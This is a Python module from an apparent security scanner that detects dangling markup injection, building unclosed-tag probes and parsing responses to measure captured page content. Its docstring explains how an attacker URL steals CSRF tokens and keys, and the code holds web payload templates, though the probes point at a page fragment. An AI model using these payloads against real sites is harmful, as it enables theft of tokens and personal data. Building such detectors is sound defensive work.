"""Dangling markup injection (DMI) detection.

Dangling markup is the classic fallback when an application reflects
``<`` and quotes but filters ``>`` (or strips event handlers/``javascript:``):
the attacker opens a tag such as ``<img src='//attacker/`` and never closes
it, so the browser parses the *rest of the document* — CSRF tokens, API keys,
PII — as part of the ``src`` attribute and sends it to the attacker when the
image loads.

This module is deliberately browser-shaped rather than regex-shaped: a small
HTML tokenizer walks the injected tag exactly the way an HTML5 parser does
(quoted attribute values may contain ``>`` and ``<``; the value ends at the
matching quote or at EOF), then reports how much server-generated markup was
captured into the attribute.

The generated probe URLs point at a fragment on the current page (``#token``)
so a scan never exfiltrates data to a third party.  A finding states that
replacing the fragment with an attacker URL weaponises the sink.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Iterator, List, Optional, Tuple

#: Minimum number of captured characters before a sink is reported.  A tag
#: that swallows only ``</div>`` proves parser behaviour but leaks nothing
#: useful, so it stays a debug observation instead of a finding.
MIN_CAPTURED = 12

_WHITESPACE = " \t\r\n\f"

#: Contexts in which a dangling tag can be opened by prefixing the payload.
#: ``None`` means the payload cannot start a real tag in that context.
_CONTEXT_PREFIXES = {
    "html": "",
    "attr_double": '">',
    "attr_single": "'>",
    "attr_unquoted": " >",
    "script": "</script>",
    "style": "</style>",
    "textarea": "</textarea>",
    "comment": "-->",
}

#: ``(tag, attribute)`` pairs used for the probes.  ``img`` is first because
#: it is the only element that leaks without user interaction, which is what
#: makes dangling markup a zero-click bug in practice.
_PROBE_TAGS: Tuple[Tuple[str, str], ...] = (
    ("img", "src"),
    ("a", "href"),
    ("form", "action"),
)

_SECRET_RUN = re.compile(r"[A-Za-z0-9+/=_\-]{24,}")


@dataclass
class DanglingCapture:
    """Result of simulating one dangling-markup probe."""

    detected: bool = False
    payload: str = ""
    tag: str = ""
    attribute: str = ""
    quote: str = ""
    captured_length: int = 0
    captured_preview: str = ""
    value: str = ""
    open_at_eof: bool = False
    reason: str = ""


@dataclass
class _Attribute:
    """One parsed attribute of an injected tag."""

    tag: str
    name: str
    quote: str
    value: str
    open_at_eof: bool


def _redact(value: str, limit: int = 96) -> str:
    """Collapse and redact captured page content for safe reporting."""
    collapsed = re.sub(r"\s+", " ", value or "").strip()
    collapsed = _SECRET_RUN.sub("<redacted>", collapsed)
    if len(collapsed) > limit:
        collapsed = collapsed[:limit] + "..."
    return collapsed


def _iter_attributes(text: str, start: int, limit: int) -> Iterator[_Attribute]:
    """Yield the attributes of the tag beginning at ``text[start]`` (a ``<``).

    The tokenizer follows the HTML5 rules that matter for dangling markup:

    * in a quoted value ``>`` and ``<`` are literal characters;
    * an unclosed quoted value runs to end of document (or ``limit``);
    * an unquoted value ends at whitespace or ``>``;
    * a ``>`` outside an attribute value closes the tag.

    ``limit`` truncates the walk, which lets the same tokenizer answer
    "is this offset inside an attribute value?" as well as "did this attribute
    capture the rest of the document?".
    """
    length = min(limit, len(text))
    index = start + 1
    if index >= length or text[index] in "/!?":
        return

    name_start = index
    while index < length and (
        text[index].isalnum() or text[index] in "-:_"
    ):
        index += 1
    tag = text[name_start:index].lower()
    if not tag:
        return

    while index < length:
        while index < length and text[index] in _WHITESPACE:
            index += 1
        if index >= length:
            return
        if text[index] == ">":
            return
        if text[index] == "/":
            if index + 1 < length and text[index + 1] == ">":
                return
            index += 1
            continue

        attr_start = index
        while index < length and text[index] not in _WHITESPACE + "=/>":
            index += 1
        attribute = text[attr_start:index].lower()
        if index == attr_start:
            # A stray ``=`` (or another delimiter) would otherwise loop forever.
            index += 1
            continue
        while index < length and text[index] in _WHITESPACE:
            index += 1
        if index >= length or text[index] != "=":
            continue
        index += 1
        while index < length and text[index] in _WHITESPACE:
            index += 1
        if index >= length:
            return

        if text[index] in "\"'":
            quote = text[index]
            index += 1
            value_start = index
            value_end = text.find(quote, index, length)
            open_at_eof = value_end < 0
            if open_at_eof:
                value_end = length
            else:
                index = value_end + 1
        else:
            quote = ""
            value_start = index
            while index < length and text[index] not in _WHITESPACE + ">":
                index += 1
            value_end = index
            open_at_eof = index >= length

        yield _Attribute(
            tag=tag,
            name=attribute,
            quote=quote,
            value=text[value_start:value_end],
            open_at_eof=open_at_eof,
        )
        if open_at_eof:
            return


def _scan_attribute_value(text: str, start: int, marker: str) -> Optional[_Attribute]:
    """Return the attribute value containing ``marker``, if any.

    ``None`` means the marker was not parsed as a real attribute of a real tag,
    so the injected tag cannot be dangling.
    """
    for attribute in _iter_attributes(text, start, len(text)):
        if marker in attribute.value:
            return attribute
    return None


def build_dangling_payloads(
    context: str, token: str, limit: int = 3
) -> List[Tuple[str, str, str]]:
    """Build ``(payload, tag, attribute)`` probes for a reflection context.

    The payload ends immediately after the attribute value's first character
    run, with no closing quote or ``>``: that is what makes the tag dangle.
    """
    prefix = _CONTEXT_PREFIXES.get(context)
    if prefix is None:
        return []
    marker = "#" + token
    probes: List[Tuple[str, str, str]] = []
    for tag, attribute in _PROBE_TAGS[: max(1, limit)]:
        probes.append((f"{prefix}<{tag} {attribute}='{marker}", tag, attribute))
    return probes


def _in_attribute_value(text: str, stop: int) -> bool:
    """Whether ``stop`` falls inside an attribute value of an open tag.

    ``detect_dangling`` assumes the injected ``<`` starts a real tag.  When the
    reflection actually lands inside an existing tag's value, that ``<`` is
    literal text, so parsing from it would produce a false positive.  This
    helper re-parses the last unclosed ``<`` before ``stop`` and reports whether
    one of its attribute values is still unterminated there.
    """
    if stop <= 0:
        return False
    last_lt = text.rfind("<", 0, stop)
    last_gt = text.rfind(">", 0, stop)
    if last_lt < 0 or last_lt < last_gt:
        return False
    # Only the innermost tag matters: a ``<`` inside a quoted value is literal
    # text, so its own tag parse would be bogus either way.
    return any(
        attribute.open_at_eof
        for attribute in _iter_attributes(text, last_lt, stop)
    )


def detect_dangling(
    response_text: str,
    payload: str,
    token: str,
    min_captured: int = MIN_CAPTURED,
) -> DanglingCapture:
    """Detect whether ``payload`` captured following markup into an attribute.

    ``payload`` must appear verbatim in ``response_text``; a rewritten or
    entity-encoded reflection cannot dangle.
    """
    result = DanglingCapture(payload=payload)
    if not response_text or not payload or not token:
        result.reason = "empty input"
        return result
    payload_at = response_text.find(payload)
    if payload_at < 0:
        result.reason = "payload not reflected verbatim"
        return result
    tag_offset = payload.find("<")
    if tag_offset < 0:
        result.reason = "payload has no tag opener"
        return result
    tag_at = payload_at + tag_offset
    if _in_attribute_value(response_text, tag_at):
        result.reason = "payload landed inside an existing attribute value"
        return result

    marker = "#" + token
    parsed = _scan_attribute_value(
        response_text, tag_at, marker
    )
    if parsed is None:
        result.reason = "tag closed before capturing content"
        return result

    marker_at = parsed.value.find(marker)
    captured = parsed.value[marker_at + len(marker):] if marker_at >= 0 else ""
    result.tag = parsed.tag
    result.attribute = parsed.name
    result.quote = parsed.quote
    result.value = parsed.value
    result.open_at_eof = parsed.open_at_eof
    result.captured_length = len(captured)
    result.captured_preview = _redact(captured)
    if len(captured.strip()) < min_captured:
        result.reason = (
            f"only {len(captured.strip())} character(s) captured "
            f"(threshold {min_captured})"
        )
        return result

    result.detected = True
    result.reason = (
        "injected attribute captured "
        f"{result.captured_length} character(s) of following markup"
    )
    return result


__all__ = [
    "MIN_CAPTURED",
    "DanglingCapture",
    "build_dangling_payloads",
    "detect_dangling",
]
